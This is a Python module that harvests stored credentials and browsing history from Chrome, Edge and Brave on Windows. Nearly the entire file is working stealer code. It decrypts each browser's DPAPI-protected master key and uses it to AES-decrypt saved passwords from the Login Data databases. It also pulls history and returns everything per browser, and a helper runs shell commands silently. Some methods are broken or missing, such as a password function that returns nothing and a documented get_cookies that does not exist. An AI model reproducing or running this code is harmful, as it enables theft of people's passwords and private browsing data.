import os
import subprocess
import sqlite3
import shutil
from typing import Any
import win32crypt
from Cryptodome.Cipher import AES
import base64
import json
from urllib.parse import urlparse
import pprint
import io


# Function to get the master key for Google Chrome
def _get_master_key():
    with open(
        os.environ["USERPROFILE"]
        + os.sep
        + r"AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        "r",
        encoding="utf-8",
    ) as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


# Function to get the master key for Microsoft Edge
def _get_master_key_edge():
    with open(
        os.environ["USERPROFILE"]
        + os.sep
        + r"AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
        "r",
        encoding="utf-8",
    ) as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


# Function to get the master key for Brave Browser
def _get_master_key_brave():
    with open(
        os.environ["USERPROFILE"]
        + os.sep
        + r"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "r",
        encoding="utf-8",
    ) as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


# Function to decrypt the payload using the cipher
def _decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


# Function to generate the cipher using the AES key and IV
def _generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


# Function to decrypt the password using the master key
def _decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = _generate_cipher(master_key, iv)
        decrypted_pass = _decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return e


# Function to execute a command using subprocess
def _command(command):
    # Use subprocess to start the command in the background
    process = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        close_fds=True,
    )

    # Close the parent process
    process.poll()
    process.terminate()


class Browser:
    class Chrome:
        def get_history() -> dict:
            try:
                # _command("taskkill /im chrome.exe /f")
                DATA = {}
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = f"{AppData}\\Local\\Google\\Chrome\\User Data\\Default\\History"
                shutil.copyfile(Path, Path.replace("History", "hisbackup"))
                Path = Path.replace("History", "hisbackup")
                if os.path.isfile(Path):
                    conn = sqlite3.connect(Path)
                    cr = conn.cursor()
                    cr.execute("SELECT url , visit_count from urls")
                    v = cr.fetchall()
                    for url, visit_count in v:
                        DATA[url] = visit_count

                try:
                    conn.close()
                    os.remove(Path)
                except:
                    pass
                return DATA
            except Exception as e:
                return e

        def get_password_lt_80() -> dict:
            DATA = {}
            AppData = os.getenv("APPDATA").split("\Roaming")[0]
            Path = f"{AppData}\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            shutil.copyfile(Path, Path.replace("Login Data", "lgbackup"))
            Path = Path.replace("Login Data", "lgbackup")
            if os.path.isfile(Path):
                print(Path)
                conn = sqlite3.connect(Path)
                cr = conn.cursor()
                cr.execute(
                    "SELECT action_url, username_value, password_value FROM logins"
                )
                value = cr.fetchall()
                for url, username, password in value:
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0
                    )[1]
                    print("Decrypted password:", password)
                    if password:
                        parsed_url = urlparse(url)
                        url = parsed_url.netloc
                        DATA[url] = {}
                        DATA[url]["username"] = username
                        DATA[url]["password"] = password

        def get_passwords():
            try:
                DATA = {}
                master_key = _get_master_key()
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = (
                    f"{AppData}\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
                )
                shutil.copyfile(Path, Path.replace("Login Data", "lgbackup"))
                Path = Path.replace("Login Data", "lgbackup")
                conn = sqlite3.connect(Path)
                cr = conn.cursor()
                try:
                    cr.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )
                    for r in cr.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = _decrypt_password(
                            encrypted_password, master_key
                        )
                        parsed_url = urlparse(url)
                        url = parsed_url.netloc
                        DATA[url] = {}
                        DATA[url]["username"] = username
                        DATA[url]["password"] = decrypted_password
                    try:
                        conn.close()
                        os.remove(Path)
                    except Exception as e:
                        pass
                    return DATA
                except Exception as e:
                    return e

            except:
                try:
                    return Browser.Chrome.get_password_lt_80()
                except Exception as e:
                    return e
        def get_all():
            try:
                passwords = Browser.Chrome.get_passwords()
            except:
                try:
                    passwords= Browser.Chrome.get_password_lt_80()
                except:
                    pass
            history = Browser.Chrome.get_history()
            DATA = {}
            DATA["passwords"] = passwords
            DATA["history"]   = history
            return DATA

    class Brave:
        def get_history() -> dict:
            try:
                # _command("taskkill /im brave.exe /f")
                DATA = {}
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = f"{AppData}\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
                shutil.copyfile(Path, Path.replace("History", "hisbackup"))
                Path = Path.replace("History", "hisbackup")
                if os.path.isfile(Path):
                    conn = sqlite3.connect(Path)
                    cr = conn.cursor()
                    cr.execute("SELECT url , visit_count from urls")
                    v = cr.fetchall()
                    for url, visit_count in v:
                        DATA[url] = visit_count
                try:
                    conn.close()
                    os.remove(Path)
                except:
                    pass
                return DATA
            except Exception as e:
                return e

        def get_passwords() -> dict:
            try:
                DATA = {}
                master_key = _get_master_key_brave()
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = f"{AppData}\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data"
                shutil.copyfile(Path, Path.replace("Login Data", "lgbackup"))
                Path = Path.replace("Login Data", "lgbackup")
                conn = sqlite3.connect(Path)
                cr = conn.cursor()
                try:
                    cr.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )
                    for r in cr.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = _decrypt_password(
                            encrypted_password, master_key
                        )
                        parsed_url = urlparse(url)
                        url = parsed_url.netloc
                        DATA[url] = {}
                        DATA[url]["username"] = username
                        DATA[url]["password"] = decrypted_password
                    try:
                        conn.close()
                        os.remove(Path)
                    except Exception as e:
                        pass
                    return DATA
                except Exception as e:
                    return e

            except:
                pass
        
        def get_all():
            try:
                passwords = Browser.Brave.get_passwords()
            except:
                try:
                    passwords= Browser.Brave.get_password_lt_80()
                except:
                    pass
            history = Browser.Brave.get_history()
            DATA = {}
            DATA["passwords"] = passwords
            DATA["history"]   = history
            return DATA

    class Edge:
        def get_history() -> dict:
            try:
                DATA = {}
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = f"{AppData}\\Local\\Microsoft\\Edge\\User Data\\default\\History"
                try:
                    shutil.copyfile(Path, Path.replace("History", "hisbackup"))
                except:
                    pass
                Path = Path.replace("History", "hisbackup")
                if os.path.isfile(Path):
                    conn = sqlite3.connect(Path)
                    cr = conn.cursor()
                    cr.execute("SELECT url , visit_count from urls")
                    v = cr.fetchall()
                    for url, visit_count in v:
                        DATA[url] = visit_count
                try:
                    conn.close()
                    os.remove(Path)
                except:
                    pass
                return DATA
            except Exception as e:
                return e

        def get_passwords() -> dict:
            try:
                DATA = {}
                master_key = _get_master_key_edge()
                AppData = os.getenv("APPDATA").split("\Roaming")[0]
                Path = (
                    f"{AppData}\\Local\\Microsoft\\Edge\\User Data\\default\\Login Data"
                )
                shutil.copyfile(Path, Path.replace("Login Data", "lgbackup"))
                Path = Path.replace("Login Data", "lgbackup")
                conn = sqlite3.connect(Path)
                cr = conn.cursor()
                try:
                    cr.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )
                    for r in cr.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = _decrypt_password(
                            encrypted_password, master_key
                        )
                        parsed_url = urlparse(url)
                        url = parsed_url.netloc
                        DATA[url] = {}
                        DATA[url]["username"] = username
                        DATA[url]["password"] = decrypted_password
                    try:
                        conn.close()
                        os.remove(Path)
                    except Exception as e:
                        pass
                    return DATA
                except Exception as e:
                    return e

            except:
                pass
        
        def get_all():
            try:
                passwords = Browser.Edge.get_passwords()
            except:
                try:
                    passwords= Browser.Edge.get_password_lt_80()
                except:
                    pass
            history = Browser.Edge.get_history()
            DATA = {}
            DATA["passwords"] = passwords
            DATA["history"]   = history
            return DATA

    class All:
        def get_all_browsers():
            Data = {}
            Data['brave'] = Browser.Brave.get_all()
            Data['chrome'] = Browser.Chrome.get_all()
            Data['edge'] = Browser.Edge.get_all()
            return Data




"""
browser.chrome.get_passwords() --> dict 
browser.chrome.get_cookies()   --> dict
"""